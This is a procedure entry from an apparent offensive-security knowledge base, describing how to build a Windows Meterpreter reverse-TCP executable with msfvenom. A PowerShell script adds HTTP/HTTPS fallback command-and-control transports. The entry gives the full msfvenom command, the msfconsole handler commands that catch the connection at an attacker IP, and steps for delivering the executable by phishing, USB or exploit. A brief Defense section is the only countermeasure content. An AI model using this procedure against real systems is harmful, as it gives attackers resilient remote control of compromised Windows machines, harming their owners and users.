---
id: d668d307-95a1-4eb1-adff-bcaff6e55942
name: Metasploit Multiple Transports Payload Generator
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.702219+00:00'
updated_at: '2023-05-26T00:58:25.293102+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/External Remote Services|T1133 - External Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Multiple transports]]'
commands:
  - >-
    [[commands/msfvenom-generate-windows-meterpreter-reverse-tcp-multi-transport]]
  - '[[commands/add-tcp-transport-to-meterpreter]]'
  - '[[commands/add-web-transport-to-meterpreter]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Metasploit Multiple Transports Payload Generator

## Summary

This procedure generates a custom Windows Meterpreter reverse TCP payload using Metasploit's msfvenom tool, enhanced with multiple transport options (TCP and HTTP/HTTPS) to improve connection reliability in restricted environments. By loading a PowerShell extension script at payload initialization, the payload automatically attempts multiple fallback communication channels, making it more resilient to network filtering or intermittent connectivity.

## Description

In offensive security operations, payloads often fail due to firewall rules blocking specific protocols or ports. This procedure leverages Metasploit's extensibility to create a payload that supports multiple transports: a primary TCP connection with retries, and fallback web-based (HTTP/HTTPS) channels. The payload is generated as a Windows executable and uses PowerShell extensions to dynamically add transports upon execution. This is particularly useful for initial access vectors like phishing or exploiting public-facing applications, where persistence through reliable C2 is critical. The target environment is Windows systems, assuming the attacker has a listener set up in msfconsole. Success results in a Meterpreter session with multi-transport capabilities, allowing command execution, file transfer, and further post-exploitation.

## Requirements

1. Metasploit Framework installed and running (see [[tools/Metasploit-Framework]] for setup).
2. Knowledge of the attacker's listener IP (LHOST) and ports (LPORT for TCP, additional for web).
3. A local URI (LURI) for web transport staging.
4. PowerShell execution policy allowing script loading on the target (or bypassed via payload).
5. Network access to deliver and receive connections from the target.

## Defense

- Implement application whitelisting and restrict PowerShell execution with constrained language mode or script block logging.
- Monitor for anomalous outbound connections to attacker IPs on non-standard ports, including HTTP/HTTPS POSTs with suspicious payloads.
- Use endpoint detection tools to scan for Meterpreter processes or unsigned executables.
- Network segmentation and egress filtering to block multi-protocol C2 attempts.

## Objectives

1. Generate a resilient payload for initial access to Windows targets.
2. Establish a Meterpreter session with automatic transport fallbacks for persistence.
3. Test organizational defenses against multi-channel C2 evasion techniques.

## Instructions

### Step 1: Prepare the AddTransports PowerShell Script

**Context**: Create the PowerShell script that will be loaded into the payload to add multiple transports. This script defines functions to configure TCP and web transports with retry logic, ensuring the session can failover if the primary channel fails. Save the script content from [[codes/AddTransports-Powershell-Script]] to a file, e.g., `/home/user/AddTransports.ps1` on your Kali machine.

**Why**: This script is initialized at payload startup via extinit, automatically configuring resilient C2 channels without manual intervention post-compromise.

### Step 2: Generate the Multi-Transport Payload

**Context**: Use msfvenom to create the Windows Meterpreter reverse TCP executable, embedding the PowerShell extensions and script path. This bundles stdapi, priv, and PowerShell modules, with retries for connection attempts.

**Command** ([[commands/msfvenom-generate-windows-meterpreter-reverse-tcp-multi-transport]]):
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=<tcp_port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/path/to/AddTransports.ps1 -f exe -o multi_transport_payload.exe
```

> This command produces an executable payload that connects back to the specified LHOST and LPORT via TCP, with 30 retries at 10-second intervals. The extinit loads the PowerShell script to add web transports as fallback. Expected output is the generation message: "[*] Writing 37349 bytes to multi_transport_payload.exe". Verify the file exists and is executable-sized (~38KB).

**Success Criteria**: Payload file created without errors; no syntax issues in msfvenom output.

### Step 3: Set Up the Listener in msfconsole

**Context**: Start a handler in Metasploit to catch the incoming session. This should match the payload's LHOST/LPORT and support the added transports.

**Instructions**: Launch msfconsole, then:
```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set LHOST <attacker_ip>
set LPORT <tcp_port>
exploit -j
```

**Why**: The handler will receive the session and automatically apply the transport configurations from the loaded script.

**Expected Output**: "[*] Started reverse TCP handler on <attacker_ip>:<tcp_port>".

### Step 4: Deliver and Execute the Payload

**Context**: Distribute the generated .exe via phishing, USB, or exploit, then monitor for connection.

**Instructions**: On the target, execute `multi_transport_payload.exe`. If the primary TCP fails (e.g., blocked), the script adds web transport, attempting HTTP/HTTPS fallback.

**Expected Output**: In msfconsole, "[*] Meterpreter session 1 opened". Run `transport` in the session to verify multiple channels: TCP and HTTP/HTTPS listed with retry settings.

**Success Criteria**: Active session with `show transports` displaying added TCP and web options; test failover by blocking TCP and confirming web connection.
